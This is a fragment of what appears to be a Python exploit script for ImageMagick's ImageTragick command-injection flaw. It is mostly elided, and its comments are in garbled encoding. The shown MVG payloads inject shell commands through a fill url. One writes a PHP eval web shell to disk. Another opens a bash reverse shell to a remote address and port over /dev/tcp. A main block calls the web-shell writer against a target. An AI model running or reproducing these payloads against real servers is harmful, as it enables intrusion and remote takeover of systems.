...
viewbox 0 0 640 480
fill 'url(https://192.168.42.130:8000/1.jpg"|echo \\'<?php eval($_POST[\\'ant\\']);?>\\' > shell.php")'
pop graphic-context
'''
...
viewbox 0 0 640 480
fill 'url(https://192.168.42.130:8000/1.jpg"|bash -i >& /dev/tcp/192.168.1.101/2333 0>&1")'
pop graphic-context"""
...
if __name__ == '__main__':
    # Ð´ webshell
    writeshell("http://192.168.42.130:8000/")
    # ·´µ¯ shell
